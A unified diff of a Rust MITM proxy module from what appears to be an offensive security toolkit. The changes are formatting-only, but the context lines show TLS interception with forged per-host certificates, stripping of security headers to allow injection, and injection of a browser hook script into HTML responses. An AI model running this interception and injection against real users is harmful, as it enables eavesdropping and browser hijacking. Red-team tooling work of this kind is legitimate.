@@ -29,18 +29,18 @@
 
 use std::collections::HashMap;
 use std::fs::{File, OpenOptions};
-use std::io::{Read, Write, BufWriter};
+use std::io::{BufWriter, Read, Write};
 use std::net::{SocketAddr, TcpListener, TcpStream, ToSocketAddrs};
 use std::path::PathBuf;
-use std::sync::{Arc, RwLock, Mutex};
+use std::sync::{Arc, Mutex, RwLock};
 use std::thread;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
+use super::{Address, Protocol, ProxyContext, ProxyError, ProxyResult};
 use crate::crypto::certs::ca::{CertificateAuthority, KeyAlgorithm};
 use crate::crypto::certs::x509::Certificate;
 use crate::modules::exploit::browser::hook as rbb_hook;
-use super::{Address, ProxyContext, ProxyError, ProxyResult, Protocol};
-use crate::{debug, info, warn, error};
+use crate::{debug, error, info, warn};
 
 /// Log format for traffic logging
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -165,7 +165,8 @@ impl TrafficLogger {
             LogFormat::Json => {
                 let json = format!(
                     r#"{{"ts":{},"type":"info","message":"{}"}}"#,
-                    timestamp, message.replace('"', "\\\"")
+                    timestamp,
+                    message.replace('"', "\\\"")
                 );
                 self.write_line(&json);
             }
@@ -173,7 +174,14 @@ impl TrafficLogger {
     }
 
     /// Log a WebSocket frame
-    pub fn log_ws_frame(&self, hostname: &str, direction: &str, frame_num: u64, frame_type: &str, size: usize) {
+    pub fn log_ws_frame(
+        &self,
+        hostname: &str,
+        direction: &str,
+        frame_num: u64,
+        frame_type: &str,
+        size: usize,
+    ) {
         if !self.is_enabled() {
             return;
         }
@@ -185,8 +193,10 @@ impl TrafficLogger {
 
         match self.format {
             LogFormat::Text => {
-                let msg = format!("[{}] WebSocket {} frame #{}: {} ({} bytes)",
-                    hostname, direction, frame_num, frame_type, size);
+                let msg = format!(
+                    "[{}] WebSocket {} frame #{}: {} ({} bytes)",
+                    hostname, direction, frame_num, frame_type, size
+                );
                 self.write_line(&msg);
             }
             LogFormat::Json => {
@@ -256,9 +266,17 @@ impl std::fmt::Debug for MitmConfig {
             .field("ca", &self.ca)
             .field("timeout", &self.timeout)
             .field("log_requests", &self.log_requests)
-            .field("logger", &format!("stdout={}, file={:?}, format={:?}",
-                self.logger.log_stdout, self.logger.log_file, self.logger.format))
-            .field("interceptor", &self.interceptor.as_ref().map(|_| "<interceptor>"))
+            .field(
+                "logger",
+                &format!(
+                    "stdout={}, file={:?}, format={:?}",
+                    self.logger.log_stdout, self.logger.log_file, self.logger.format
+                ),
+            )
+            .field(
+                "interceptor",
+                &self.interceptor.as_ref().map(|_| "<interceptor>"),
+            )
             .field("hook_url", &self.hook_url)
             .field("hook_mode", &self.hook_mode)
             .finish()
@@ -281,7 +299,10 @@ impl MitmConfig {
     }
 
     /// Set request interceptor
-    pub fn with_interceptor(mut self, interceptor: impl RequestInterceptor + Send + Sync + 'static) -> Self {
+    pub fn with_interceptor(
+        mut self,
+        interceptor: impl RequestInterceptor + Send + Sync + 'static,
+    ) -> Self {
         self.interceptor = Some(Arc::new(interceptor));
         self
     }
@@ -322,7 +343,12 @@ impl MitmConfig {
     }
 
     /// Configure traffic logging
-    pub fn with_logger(mut self, log_stdout: bool, log_file: Option<PathBuf>, format: LogFormat) -> Self {
+    pub fn with_logger(
+        mut self,
+        log_stdout: bool,
+        log_file: Option<PathBuf>,
+        format: LogFormat,
+    ) -> Self {
         let has_file = log_file.is_some();
         self.logger = TrafficLogger::new(log_stdout, log_file, format);
         self.log_requests = log_stdout || has_file;
@@ -434,10 +460,14 @@ impl HttpRequest {
 
     /// Check if this is a WebSocket upgrade request
     pub fn is_websocket_upgrade(&self) -> bool {
-        let connection = self.headers.get("connection")
+        let connection = self
+            .headers
+            .get("connection")
             .map(|s| s.to_lowercase())
             .unwrap_or_default();
-        let upgrade = self.headers.get("upgrade")
+        let upgrade = self
+            .headers
+            .get("upgrade")
             .map(|s| s.to_lowercase())
             .unwrap_or_default();
 
@@ -449,7 +479,9 @@ impl HttpRequest {
         let mut buf = Vec::new();
 
         // Request line
-        buf.extend_from_slice(format!("{} {} {}\r\n", self.method, self.path, self.version).as_bytes());
+        buf.extend_from_slice(
+            format!("{} {} {}\r\n", self.method, self.path, self.version).as_bytes(),
+        );
 
         // Headers
         for (key, value) in &self.headers {
@@ -526,7 +558,13 @@ impl HttpResponse {
         let mut buf = Vec::new();
 
         // Status line
-        buf.extend_from_slice(format!("{} {} {}\r\n", self.version, self.status_code, self.status_text).as_bytes());
+        buf.extend_from_slice(
+            format!(
+                "{} {} {}\r\n",
+                self.version, self.status_code, self.status_text
+            )
+            .as_bytes(),
+        );
 
         // Headers
         for (key, value) in &self.headers {
@@ -556,9 +594,12 @@ impl HttpResponse {
 
     /// Check if this is a WebSocket upgrade response (101 Switching Protocols)
     pub fn is_websocket_upgrade(&self) -> bool {
-        self.status_code == 101 && self.headers.get("upgrade")
-            .map(|s| s.to_lowercase().contains("websocket"))
-            .unwrap_or(false)
+        self.status_code == 101
+            && self
+                .headers
+                .get("upgrade")
+                .map(|s| s.to_lowercase().contains("websocket"))
+                .unwrap_or(false)
     }
 
     /// Strip security headers that prevent MITM/Injection
@@ -607,7 +648,9 @@ impl CertCache {
         }
 
         // Generate new certificate
-        let (cert, key_der) = self.ca.generate_cert(hostname)
+        let (cert, key_der) = self
+            .ca
+            .generate_cert(hostname)
             .map_err(|e| ProxyError::Tls(format!("Failed to generate cert: {}", e)))?;
 
         let cert_pem = cert.to_pem();
@@ -617,7 +660,10 @@ impl CertCache {
         };
 
         // Cache it
-        self.cache.write().unwrap().insert(hostname.to_string(), (cert_pem.clone(), key_pem.clone()));
+        self.cache
+            .write()
+            .unwrap()
+            .insert(hostname.to_string(), (cert_pem.clone(), key_pem.clone()));
 
         Ok((cert_pem, key_pem))
     }
@@ -656,7 +702,8 @@ impl MitmProxy {
                     let cert_cache = self.cert_cache.clone();
 
                     thread::spawn(move || {
-                        if let Err(e) = Self::handle_client(client, &config, &context, &cert_cache) {
+                        if let Err(e) = Self::handle_client(client, &config, &context, &cert_cache)
+                        {
                             debug!("Client error: {}", e);
                         }
                     });
@@ -695,7 +742,8 @@ impl MitmProxy {
         // Parse CONNECT request
         if !request.starts_with("CONNECT ") {
             // Not a CONNECT request - could handle as regular HTTP proxy
-            let response = "HTTP/1.1 400 Bad Request\r\n\r\nOnly CONNECT method supported for MITM\r\n";
+            let response =
+                "HTTP/1.1 400 Bad Request\r\n\r\nOnly CONNECT method supported for MITM\r\n";
             client.write_all(response.as_bytes())?;
             return Ok(());
         }
@@ -710,9 +758,10 @@ impl MitmProxy {
         // Connect to target
         let target_addr = format!("{}:{}", hostname, port);
         let mut target_stream = TcpStream::connect_timeout(
-            &target_addr.to_socket_addrs()?.next().ok_or_else(|| {
-                ProxyError::ResolutionFailed(hostname.clone())
-            })?,
+            &target_addr
+                .to_socket_addrs()?
+                .next()
+                .ok_or_else(|| ProxyError::ResolutionFailed(hostname.clone()))?,
             config.timeout,
         )?;
 
@@ -725,13 +774,7 @@ impl MitmProxy {
 
         if port == 443 || port == 8443 {
             // TLS interception
-            Self::handle_tls_intercept(
-                client,
-                target_stream,
-                &hostname,
-                config,
-                cert_cache,
-            )
+            Self::handle_tls_intercept(client, target_stream, &hostname, config, cert_cache)
         } else {
             // Plain TCP relay
             Self::relay_tcp(client, target_stream)
@@ -741,9 +784,10 @@ impl MitmProxy {
     /// Parse CONNECT target from request
     fn parse_connect_target(request: &str) -> ProxyResult<Address> {
         // CONNECT host:port HTTP/1.1
-        let first_line = request.lines().next().ok_or_else(|| {
-            ProxyError::Protocol("Empty request".into())
-        })?;
+        let first_line = request
+            .lines()
+            .next()
+            .ok_or_else(|| ProxyError::Protocol("Empty request".into()))?;
 
         let parts: Vec<_> = first_line.split_whitespace().collect();
         if parts.len() < 2 {
@@ -753,9 +797,9 @@ impl MitmProxy {
         let host_port = parts[1];
         if let Some(colon) = host_port.rfind(':') {
             let host = &host_port[..colon];
-            let port: u16 = host_port[colon + 1..].parse().map_err(|_| {
-                ProxyError::Protocol("Invalid port".into())
-            })?;
+            let port: u16 = host_port[colon + 1..]
+                .parse()
+                .map_err(|_| ProxyError::Protocol("Invalid port".into()))?;
             Ok(Address::from_domain(host, port))
         } else {
             Err(ProxyError::Protocol("Missing port in CONNECT".into()))
@@ -770,9 +814,9 @@ impl MitmProxy {
         config: &MitmConfig,
         cert_cache: &CertCache,
     ) -> ProxyResult<()> {
-        use boring::ssl::{SslAcceptor, SslConnector, SslMethod, SslFiletype, SslVerifyMode};
-        use boring::x509::X509;
         use boring::pkey::PKey;
+        use boring::ssl::{SslAcceptor, SslConnector, SslFiletype, SslMethod, SslVerifyMode};
+        use boring::x509::X509;
 
         // Get/generate certificate for this hostname
         let (cert_pem, key_pem) = cert_cache.get_cert(hostname)?;
@@ -787,21 +831,25 @@ impl MitmProxy {
         let key = PKey::private_key_from_pem(key_pem.as_bytes())
             .map_err(|e| ProxyError::Tls(format!("Key parse failed: {}", e)))?;
 
-        acceptor.set_private_key(&key)
+        acceptor
+            .set_private_key(&key)
             .map_err(|e| ProxyError::Tls(format!("Set key failed: {}", e)))?;
-        acceptor.set_certificate(&cert)
+        acceptor
+            .set_certificate(&cert)
             .map_err(|e| ProxyError::Tls(format!("Set cert failed: {}", e)))?;
 
         // Add CA cert to chain
         let ca_cert = X509::from_pem(config.ca.export_ca_pem().as_bytes())
             .map_err(|e| ProxyError::Tls(format!("CA cert parse failed: {}", e)))?;
-        acceptor.add_extra_chain_cert(ca_cert)
+        acceptor
+            .add_extra_chain_cert(ca_cert)
             .map_err(|e| ProxyError::Tls(format!("Add chain failed: {}", e)))?;
 
         let acceptor = acceptor.build();
 
         // Accept TLS from client
-        let mut client_tls = acceptor.accept(client)
+        let mut client_tls = acceptor
+            .accept(client)
             .map_err(|e| ProxyError::Tls(format!("TLS accept failed: {}", e)))?;
 
         info!("TLS handshake with client complete for {}", hostname);
@@ -816,7 +864,8 @@ impl MitmProxy {
         let connector = connector.build();
 
         // Connect TLS to target
-        let mut target_tls = connector.connect(hostname, target)
+        let mut target_tls = connector
+            .connect(hostname, target)
             .map_err(|e| ProxyError::Tls(format!("TLS connect failed: {}", e)))?;
 
         info!("TLS handshake with target complete for {}", hostname);
@@ -867,9 +916,15 @@ impl MitmProxy {
         let js_body = rbb_hook::generate_hook_js_with_session(callback_url, &session_id);
 
         let mut headers = HashMap::new();
-        headers.insert("content-type".to_string(), "application/javascript; charset=utf-8".to_string());
+        headers.insert(
+            "content-type".to_string(),
+            "application/javascript; charset=utf-8".to_string(),
+        );
         headers.insert("content-length".to_string(), js_body.len().to_string());
-        headers.insert("cache-control".to_string(), "no-cache, no-store, must-revalidate".to_string());
+        headers.insert(
+            "cache-control".to_string(),
+            "no-cache, no-store, must-revalidate".to_string(),
+        );
         headers.insert("pragma".to_string(), "no-cache".to_string());
         headers.insert("expires".to_string(), "0".to_string());
 
@@ -881,7 +936,7 @@ impl MitmProxy {
             format!(
                 "_rb_sid={}; Path=/; Domain={}; SameSite=Lax; Max-Age=86400",
                 session_id, root_domain
-            )
+            ),
         );
 
         HttpResponse {
@@ -927,7 +982,11 @@ impl MitmProxy {
             }
             HookMode::SameOrigin { path, callback_url } => {
                 // Same-origin mode: inject relative path, intercept requests to that path
-                (format!("<script src=\"{}\"></script>", path), Some(path.clone()), Some(callback_url.clone()))
+                (
+                    format!("<script src=\"{}\"></script>", path),
+                    Some(path.clone()),
+                    Some(callback_url.clone()),
+                )
             }
         };
 
@@ -948,7 +1007,9 @@ impl MitmProxy {
             let mut serve_hook_directly = false;
 
             if let Some(mut req) = HttpRequest::parse(&data_to_send) {
-                config.logger.log_request(hostname, &req.method, &req.path, &req.version);
+                config
+                    .logger
+                    .log_request(hostname, &req.method, &req.path, &req.version);
 
                 // Check if this request is for our hook path (same-origin mode)
                 if let Some(ref hook_path) = intercept_path {
@@ -965,7 +1026,10 @@ impl MitmProxy {
 
                 // Check for WebSocket upgrade request
                 if req.is_websocket_upgrade() {
-                    config.logger.log_info(&format!("[{}] WebSocket upgrade request detected (hook mode)", hostname));
+                    config.logger.log_info(&format!(
+                        "[{}] WebSocket upgrade request detected (hook mode)",
+                        hostname
+                    ));
                     is_websocket_upgrade = true;
                     // Don't modify WebSocket upgrade requests
                 } else if !serve_hook_directly {
@@ -981,10 +1045,14 @@ impl MitmProxy {
             if serve_hook_directly {
                 if let Some(ref cb_url) = callback_url {
                     let resp = Self::generate_hook_response(cb_url, hostname);
-                    config.logger.log_response(hostname, resp.status_code, &resp.status_text);
+                    config
+                        .logger
+                        .log_response(hostname, resp.status_code, &resp.status_text);
                     config.logger.log_info(&format!(
                         "[{}] Served RBB hook ({} bytes) with session cookie - callback: {}",
-                        hostname, resp.body.len(), cb_url
+                        hostname,
+                        resp.body.len(),
+                        cb_url
                     ));
                     client.write_all(&resp.to_bytes())?;
                     continue;
@@ -1006,14 +1074,24 @@ impl MitmProxy {
             // Handle WebSocket upgrade response
             if is_websocket_upgrade {
                 if let Some(resp) = HttpResponse::parse(&resp_data) {
-                    config.logger.log_response(hostname, resp.status_code, &resp.status_text);
+                    config
+                        .logger
+                        .log_response(hostname, resp.status_code, &resp.status_text);
 
                     if resp.is_websocket_upgrade() {
-                        config.logger.log_info(&format!("[{}] WebSocket upgrade accepted (101 Switching Protocols)", hostname));
+                        config.logger.log_info(&format!(
+                            "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
+                            hostname
+                        ));
                         // Forward the upgrade response to client
                         client.write_all(&resp_data)?;
                         // Switch to WebSocket passthrough mode
-                        return Self::websocket_passthrough(client, target, hostname, &config.logger);
+                        return Self::websocket_passthrough(
+                            client,
+                            target,
+                            hostname,
+                            &config.logger,
+                        );
                     }
                 }
                 // Not a valid WebSocket upgrade, forward response anyway
@@ -1026,7 +1104,9 @@ impl MitmProxy {
                 // Strip security headers to allow injection and framing
                 resp.strip_security_headers();
 
-                let content_type = resp.headers.get("content-type")
+                let content_type = resp
+                    .headers
+                    .get("content-type")
                     .map(|s| s.to_lowercase())
                     .unwrap_or_default();
 
@@ -1040,14 +1120,19 @@ impl MitmProxy {
                         resp.body = new_body_str.into_bytes();
 
                         // Update Content-Length
-                        resp.headers.insert("content-length".to_string(), resp.body.len().to_string());
+                        resp.headers
+                            .insert("content-length".to_string(), resp.body.len().to_string());
 
-                        config.logger.log_info(&format!("Injected hook into response from {}", hostname));
+                        config
+                            .logger
+                            .log_info(&format!("Injected hook into response from {}", hostname));
                         resp_data = resp.to_bytes();
                     }
                 }
 
-                config.logger.log_response(hostname, resp.status_code, &resp.status_text);
+                config
+                    .logger
+                    .log_response(hostname, resp.status_code, &resp.status_text);
             }
 
             // Forward to client
@@ -1084,11 +1169,16 @@ impl MitmProxy {
 
                     // Parse request to log or strip headers
                     if let Some(mut req) = HttpRequest::parse(&data_to_send) {
-                        config.logger.log_request(hostname, &req.method, &req.path, &req.version);
+                        config
+                            .logger
+                            .log_request(hostname, &req.method, &req.path, &req.version);
 
                         // Check for WebSocket upgrade request
                         if req.is_websocket_upgrade() {
-                            config.logger.log_info(&format!("[{}] WebSocket upgrade request detected", hostname));
+                            config.logger.log_info(&format!(
+                                "[{}] WebSocket upgrade request detected",
+                                hostname
+                            ));
                             is_websocket_upgrade = true;
                             // Don't modify WebSocket upgrade requests
                         } else {
@@ -1114,14 +1204,26 @@ impl MitmProxy {
                         let resp_data = &target_buf[..m];
 
                         if let Some(resp) = HttpResponse::parse(resp_data) {
-                            config.logger.log_response(hostname, resp.status_code, &resp.status_text);
+                            config.logger.log_response(
+                                hostname,
+                                resp.status_code,
+                                &resp.status_text,
+                            );
 
                             if resp.is_websocket_upgrade() {
-                                config.logger.log_info(&format!("[{}] WebSocket upgrade accepted (101 Switching Protocols)", hostname));
+                                config.logger.log_info(&format!(
+                                    "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
+                                    hostname
+                                ));
                                 // Forward the upgrade response to client
                                 client.write_all(resp_data)?;
                                 // Switch to WebSocket passthrough mode
-                                return Self::websocket_passthrough(client, target, hostname, &config.logger);
+                                return Self::websocket_passthrough(
+                                    client,
+                                    target,
+                                    hostname,
+                                    &config.logger,
+                                );
                             }
                         }
 
@@ -1144,7 +1246,9 @@ impl MitmProxy {
                     let mut data_to_send = target_buf[..n].to_vec();
 
                     if let Some(mut resp) = HttpResponse::parse(&data_to_send) {
-                        config.logger.log_response(hostname, resp.status_code, &resp.status_text);
+                        config
+                            .logger
+                            .log_response(hostname, resp.status_code, &resp.status_text);
 
                         // Always strip security headers in MITM mode
                         resp.strip_security_headers();
@@ -1221,7 +1325,10 @@ impl MitmProxy {
         S1: Read + Write,
         S2: Read + Write,
     {
-        logger.log_info(&format!("[{}] WebSocket: Entering passthrough mode", hostname));
+        logger.log_info(&format!(
+            "[{}] WebSocket: Entering passthrough mode",
+            hostname
+        ));
 
         let mut client_buf = [0u8; 65536];
         let mut target_buf = [0u8; 65536];
@@ -1263,7 +1370,10 @@ impl MitmProxy {
             }
         }
 
-        logger.log_info(&format!("[{}] WebSocket: Connection closed ({} frames)", hostname, frame_count));
+        logger.log_info(&format!(
+            "[{}] WebSocket: Connection closed ({} frames)",
+            hostname, frame_count
+        ));
         Ok(())
     }
 
@@ -1302,13 +1412,21 @@ pub struct LoggingInterceptor;
 impl RequestInterceptor for LoggingInterceptor {
     fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction {
         let addr = client_addr.unwrap_or("?");
-        info!("[{}] >> {} {} (Host: {})", addr, req.method, req.path, req.host);
+        info!(
+            "[{}] >> {} {} (Host: {})",
+            addr, req.method, req.path, req.host
+        );
         InterceptAction::Continue
     }
 
     fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction {
-        info!("<< {} {} {} ({})", req.host, resp.status_code, resp.status_text,
-              resp.headers.get("content-type").unwrap_or(&"?".to_string()));
+        info!(
+            "<< {} {} {} ({})",
+            req.host,
+            resp.status_code,
+            resp.status_text,
+            resp.headers.get("content-type").unwrap_or(&"?".to_string())
+        );
         InterceptAction::Continue
     }
 }
@@ -1404,7 +1522,10 @@ mod tests {
         // Pong frame (opcode 0xA)
         assert_eq!(MitmProxy::parse_ws_frame_type(&[0x8A, 0x00]), "pong");
         // Continuation frame (opcode 0x0)
-        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x00, 0x10]), "continuation");
+        assert_eq!(
+            MitmProxy::parse_ws_frame_type(&[0x00, 0x10]),
+            "continuation"
+        );
         // Empty data
         assert_eq!(MitmProxy::parse_ws_frame_type(&[]), "empty");
     }
